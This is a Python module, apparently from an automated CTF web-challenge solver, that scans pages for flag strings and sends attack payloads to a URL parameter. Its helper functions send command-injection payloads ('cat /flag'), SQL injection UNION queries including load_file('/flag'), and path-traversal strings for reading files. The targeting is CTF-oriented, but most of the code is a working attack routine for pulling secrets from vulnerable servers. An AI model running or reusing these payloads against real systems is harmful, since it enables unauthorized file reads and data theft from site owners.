"""yang_web.core.url_analyzer._attacks 子模块 _extract（自 _attacks.py 拆分，请勿手工重排）。"""

from urllib.parse import urlparse, parse_qs, unquote, urlencode, urlunparse, quote
from urllib.request import Request, urlopen
from typing import List, Dict, Tuple, Optional, Callable
import re
import time
import html as _html
from .._engines import (AdaptiveScheduler, ConcurrentEngine, execute_attack)
from .._http import (FLAG_RE, USER_AGENT, send_request)





def _scan_static_flag(url: str, on_progress=None, on_found=None) -> Optional[Dict]:
    """Static flag scanner — find flags hidden in HTML source.
    
    Checks: HTML comments, JS variables, hidden elements, response body.
    Returns None if no flag found, else a result dict.
    """
    t0 = time.time()
    resp = send_request(url, timeout=10)
    if not resp.get('ok'):
        return None
    
    body = resp.get('body', '')
    headers_text = str(resp.get('headers', {}))
    
    # 1. HTML comments <!-- flag{...} -->
    comments = re.findall(r'<!--(.*?)-->', body, re.DOTALL)
    for c in comments:
        flags = FLAG_RE.findall(c)
        if flags:
            elapsed = int((time.time() - t0) * 1000)
            if on_found:
                try:
                    on_found(flags[0])
                except Exception:
                    pass
            if on_progress:
                try:
                    on_progress('static', 'HTML注释中发现Flag', flags[0][:60])
                except Exception:
                    pass
            return {'flag': flags[0], 'vuln_confirmed': [{'type': 'STATIC', 'location': 'HTML comment'}],
                    'attacks_run': 0, 'stages': ['static_scan', 'comment'],
                    'timing_ms': elapsed}
    
    # 2. Full response body (already searched by FLAG_RE)
    flags = FLAG_RE.findall(body)
    if flags:
        elapsed = int((time.time() - t0) * 1000)
        if on_found:
            try:
                on_found(flags[0])
            except Exception:
                pass
        if on_progress:
            try:
                on_progress('static', '响应体中发现Flag', flags[0][:60])
            except Exception:
                pass
        return {'flag': flags[0], 'vuln_confirmed': [{'type': 'STATIC', 'location': 'response body'}],
                'attacks_run': 0, 'stages': ['static_scan', 'body'],
                'timing_ms': elapsed}
    
    # 3. Response headers
    flags_h = FLAG_RE.findall(headers_text)
    if flags_h:
        elapsed = int((time.time() - t0) * 1000)
        if on_found:
            try:
                on_found(flags_h[0])
            except Exception:
                pass
        return {'flag': flags_h[0], 'vuln_confirmed': [{'type': 'STATIC', 'location': 'HTTP header'}],
                'attacks_run': 0, 'stages': ['static_scan', 'header'],
                'timing_ms': elapsed}
    
    return None



# Keep old helper functions for backward compatibility
# (ConcurrentEngine now handles flag paths internally via AdaptiveScheduler)
def _try_flag_paths(url, param, on_progress=None):
    """Deprecated: Use ConcurrentEngine + AdaptiveScheduler instead."""
    # Simplified fallback for old code paths
    for cmd in ['cat /flag', 'cat /fla*', 'cat flag.txt', 'cat /f*']:
        try:
            res = execute_attack(url, param, {
                'name': f'flag:{cmd}', 'payload': cmd,
                'method': 'replace', 'detect': 'content',
                'match': ['flag{', 'CTF{', 'ISCC{'],
            }, timeout=2)
            body = res.get('response', {}).get('body', '')
            flags = FLAG_RE.findall(body)
            if flags:
                if on_progress:
                    on_progress('flag_path', cmd, 'FLAG!')
                return flags[0]
        except Exception:
            pass
    return None



def _try_sqli_extract(url, param, on_progress=None):
    """Deprecated: SQLi extraction, kept for backward compat."""
    for ext in [
        "' UNION SELECT 1,flag,3 FROM flag-- ",
        "' UNION SELECT 1,group_concat(flag),3 FROM flag-- ",
        "' UNION SELECT 1,database(),3-- ",
        "' UNION SELECT 1,load_file('/flag'),3-- ",
    ]:
        try:
            res = execute_attack(url, param, {
                'name': 'sqli_extract', 'payload': ext,
                'method': 'append', 'detect': 'content', 'match': []})
            body = res.get('response', {}).get('body', '')
            flags = FLAG_RE.findall(body)
            if flags:
                return flags[0]
        except Exception:
            pass
    return None



def _try_lfi_flag(url, param, on_progress=None):
    """Deprecated: LFI flag read, kept for backward compat."""
    for path in ['../../../flag', '../../flag', 'flag', 'flag.php', 'flag.txt']:
        try:
            res = execute_attack(url, param, {
                'name': f'LFI {path}', 'payload': path,
                'method': 'replace', 'detect': 'content',
                'match': ['flag{', 'CTF{', 'ISCC{']})
            body = res.get('response', {}).get('body', '')
            flags = FLAG_RE.findall(body)
            if flags:
                return flags[0]
        except Exception:
            pass
    return None
